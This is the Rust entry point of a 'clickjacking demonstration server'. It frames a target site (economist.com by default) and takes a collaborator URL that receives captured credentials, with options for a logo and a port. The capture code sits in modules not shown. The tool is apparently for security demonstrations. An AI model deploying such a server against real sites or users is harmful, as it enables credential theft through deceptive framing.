mod assets;
mod server;

use std::path::PathBuf;
use std::sync::Arc;

use anyhow::Context;
use clap::Parser;
use clickjack_core::{Config, LogoSource};

use server::AppState;

#[derive(Parser)]
#[command(name = "clickjack", about = "Clickjacking demonstration server")]
struct Args {
    /// URL to load in the iframe (default: https://economist.com)
    target_url: Option<String>,

    /// Collaborator receiver URL for captured credentials
    collab_url: Option<String>,

    /// Logo: local file path or https:// URL
    #[arg(long)]
    logo: Option<String>,

    /// Port to listen on
    #[arg(long, default_value_t = 9999)]
    port: u16,

    /// Do not open a browser window automatically
    #[arg(long)]
    no_open: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt::init();

    let args = Args::parse();

    let logo = resolve_logo(args.logo.as_deref())?;

    let (logo_url, logo_path) = match &logo {
        Some(LogoSource::RemoteUrl(url)) => (url.clone(), None),
        Some(LogoSource::LocalFile(path)) => ("/logo-img".to_owned(), Some(path.clone())),
        None => (String::new(), None),
    };

    let config = Config {
        target_url: args
            .target_url
            .unwrap_or_else(|| "https://economist.com".to_owned()),
        collab_url: args.collab_url,
        port: args.port,
        logo,
    };

    let state = Arc::new(AppState {
        target_url: config.target_url.clone(),
        collab_url: config.collab_url.clone().unwrap_or_default(),
        logo_url,
        logo_path,
    });

    let addr = format!("0.0.0.0:{}", config.port);
    let server_url = format!("http://localhost:{}", config.port);

    if !args.no_open {
        let url = server_url.clone();
        tokio::spawn(async move {
            poll_until_ready(&url).await;
            if let Err(err) = open::that(&url) {
                tracing::warn!("failed to open browser: {}", err);
            }
        });
    }

    let router = server::build_router(state);
    let listener = tokio::net::TcpListener::bind(&addr)
        .await
        .with_context(|| format!("failed to bind to {addr}"))?;

    tracing::info!("listening on {}", server_url);
    axum::serve(listener, router).await.context("server error")?;

    Ok(())
}

/// Resolves the logo source from the --logo flag or by scanning the binary directory.
///
/// Returns None if no logo is configured or the specified file is not found.
fn resolve_logo(logo_flag: Option<&str>) -> anyhow::Result<Option<LogoSource>> {
    if let Some(flag) = logo_flag {
        if flag.starts_with("http://") || flag.starts_with("https://") {
            return Ok(Some(LogoSource::RemoteUrl(flag.to_owned())));
        }
        let path = PathBuf::from(flag);
        if path.exists() {
            return Ok(Some(LogoSource::LocalFile(path)));
        }
        tracing::warn!("logo file not found: {}", flag);
        return Ok(None);
    }

    // Auto-detect a logo file in the same directory as the running binary.
    if let Ok(exe) = std::env::current_exe() {
        let dir = exe.parent().unwrap_or_else(|| std::path::Path::new("."));
        for name in &["logo.svg", "logo.png", "logo.jpg", "logo.jpeg", "logo.gif"] {
            let candidate = dir.join(name);
            if candidate.exists() {
                tracing::info!("logo auto-detected: {}", candidate.display());
                return Ok(Some(LogoSource::LocalFile(candidate)));
            }
        }
    }

    Ok(None)
}

/// Polls the server address via TCP until it accepts a connection, then returns.
///
/// Tries up to 50 times with 100 ms between attempts, matching the Go version's behaviour.
async fn poll_until_ready(url: &str) {
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Duration};

    let host_port = url
        .trim_start_matches("http://")
        .trim_start_matches("https://");

    for _ in 0..50 {
        if TcpStream::connect(host_port).await.is_ok() {
            return;
        }
        sleep(Duration::from_millis(100)).await;
    }
    tracing::warn!("server did not become ready; skipping browser open");
}
